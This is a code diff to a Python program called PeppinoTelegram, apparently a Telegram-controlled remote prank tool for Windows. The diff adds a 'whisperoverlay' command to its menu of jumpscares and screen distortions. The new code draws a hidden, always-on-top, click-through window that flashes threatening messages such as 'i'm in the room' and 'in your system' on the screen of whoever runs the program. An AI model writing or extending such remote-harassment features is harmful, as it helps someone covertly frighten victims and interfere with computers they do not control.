@@ -50,12 +50,14 @@ from shutil import copy2
 from re import findall, M
 from time import time, sleep
 from threading import Thread
+from tkinter import Tk, Label
 from datetime import datetime
 from tempfile import gettempdir
 from typing import Any, Callable
 from random import choice, randint
 from urllib.request import urlretrieve
 from winotify import audio, Notification
+from random import uniform, choice, random
 from webbrowser import open as browseropen
 from string import ascii_letters, printable
 from subprocess import CREATE_NO_WINDOW, PIPE, Popen
@@ -302,6 +304,7 @@ behindyou_whisper - (Horror) "Behind you" (whisper voice).
 
 😈 Pranks & Visuals
 jumpscare - Random jumpscare.
+whisperoverlay - Displays subtle creepy messages in corner of screen.
 jumpscarenoaudio - Jumpscare without sound.
 invertedscreen - Invert screen colors.
 distortedscreen - Distort screen image.
@@ -945,6 +948,7 @@ class PeppinoTelegram:
             "hdmi_drowning_effect": self.wrapper_for_hdmi_overlay,
             "stop_hdmi_drowning_effect": self.hdmiDrownerOverlayPlayer.stop,
             "disturbed_overlay_and_random_noise": self.disturbed_overlay_and_random_noise,
+            "whisperoverlay": self.whisper_overlay,
 
             # 🦑 Misc & Memes
             "plankton": self.plankton,
@@ -1653,6 +1657,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         buttons = {
             "🔙 Back": "/mainmenu",
             "👻 Jumpscare": "/jumpscare",
+            "👻 Whisper Overlay": "/whisperoverlay",
             "😶‍🌫️ Jumpscare noaudio": "/jumpscarenoaudio",
             "🔄 Inverted screen": "/invertedscreen",
             "🌀 Distorted screen": "/distortedscreen",
@@ -2120,6 +2125,111 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             loading_bar.update(elapsed)
             sleep(1)
         loading_bar.fill_and_delete()
+
+    def whisper_overlay(self, duration: int) -> None:
+        whispers = [
+            "can you hear me",
+            "i'm here",
+            "look behind you",
+            "don't turn around",
+            "i can see you",
+            "you're not alone",
+            "the screen",
+            "close your eyes",
+            "i'm in the room",
+            "check the door",
+            "someone's behind you",
+            "don't look",
+            "i know you're there",
+            "your reflection",
+            "the window",
+            "i'm watching",
+            "not alone",
+            "behind the screen",
+            "in your system",
+            "can you see me",
+            "turn around",
+            "i'm closer",
+            "the darkness",
+            "your shadow",
+            "in the corner",
+            "don't scream",
+            "it's me",
+            "behind you",
+            "i'm inside",
+            "the silence"
+        ]
+        
+        # Create thread for the overlay
+        def run_overlay():
+            root = Tk()
+            root.title("overlay")
+            WIN_W = 250
+            WIN_H = 30
+            screen_w = root.winfo_screenwidth()
+            screen_h = root.winfo_screenheight()
+            
+            x = screen_w - WIN_W - 10
+            y = screen_h - WIN_H - 10
+            
+            root.geometry(f"{WIN_W}x{WIN_H}+{x}+{y}")
+            root.overrideredirect(True)
+            
+            root.attributes("-transparentcolor", "black")
+            root.config(bg="black")
+            label = Label(
+                root,
+                text="",
+                fg="#8B0000",
+                bg="black",
+                font=("Segoe UI", 9)
+            )
+            label.pack(expand=True)
+            
+            root.wm_attributes("-topmost", 1)
+            root.wm_attributes("-disabled", 1)
+            
+            start_time = time()
+            current_whisper = None
+            last_change = 0
+            whisper_loading_bar = self.new_loading_bar(duration)
+            
+            def update_whisper():
+                nonlocal current_whisper, last_change
+                current_time = time()
+                whisper_loading_bar.update(current_time-start_time)
+                if current_time - last_change > uniform(2, 5):
+                    current_whisper = choice(whispers)
+                    label.config(text=current_whisper)
+                    last_change = current_time
+                    
+                    if random() < 0.3:
+                        for alpha in [0.3, 0.7, 1.0, 0.7, 0.3, 0.1]:
+                            try:
+                                root.attributes("-alpha", alpha)
+                                root.update()
+                                sleep(0.05)
+                            except:
+                                break
+                        root.attributes("-alpha", 1.0)
+                
+                if current_time - start_time < duration:
+                    root.after(100, update_whisper)
+                else:
+                    for alpha in [1.0, 0.7, 0.4, 0.1, 0.0]:
+                        try:
+                            root.attributes("-alpha", alpha)
+                            root.update()
+                            sleep(0.1)
+                        except:
+                            break
+                    root.destroy()
+                    whisper_loading_bar.fill_and_delete()
+            root.after(100, update_whisper)
+            root.mainloop()
+        
+        overlay_thread = Thread(target=run_overlay, daemon=True)
+        overlay_thread.start() 
 
     def knockknock(self) -> None:
         self.__play_loaded_sound("knockknock")
